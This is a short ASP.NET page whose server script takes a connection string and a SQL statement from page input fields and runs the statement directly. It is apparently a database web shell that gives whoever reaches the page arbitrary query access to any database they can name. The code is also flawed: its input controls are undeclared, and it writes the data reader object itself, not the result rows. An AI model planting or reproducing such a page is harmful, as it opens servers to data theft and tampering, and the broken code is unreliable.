<%@ Page Language="C#" %>
<script runat="server">
void Query() { var c = new SqlConnection(); c.ConnectionString = input.Text; c.Open();
var q = new SqlCommand(query.Text, c); var r = q.ExecuteReader(); Response.Write(r); }
</script>